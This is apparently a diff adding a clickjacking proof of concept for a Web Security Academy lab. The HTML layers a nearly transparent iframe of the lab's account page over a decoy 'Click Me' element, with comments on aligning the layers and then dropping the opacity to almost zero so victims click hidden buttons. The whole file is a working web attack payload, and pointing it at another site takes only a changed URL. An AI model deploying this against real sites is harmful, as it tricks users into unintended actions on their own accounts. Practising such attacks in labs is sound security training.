@@ -1,0 +1,30 @@
+<DOCTYPE! HTML>
+<html>
+
+<head>
+  <style>
+    #target_website {
+      position:relative; 
+      width:500px; /* Gives <iframe> width and height for it to occupy space */
+      height:700px;
+      opacity:0.1; /* Set the opacity to 0.00001 after aligning the buttons */
+      z-index:2; /* Make target website on top of decoy website */
+      }
+    #decoy_website {
+      position:absolute; /* Easy to adjust position of decoy website  */
+      top: 380px;
+      left: 60px;
+      z-index:1;
+    }
+  </style>
+</head>
+
+<body>
+  <div id="decoy_website">
+	  Click Me
+  </div>
+  <iframe id="target_website" src="https://ac2b1f4d1f4ceaa7806a291000f60057.web-security-academy.net/account">
+  </iframe>
+</body>
+
+<html>
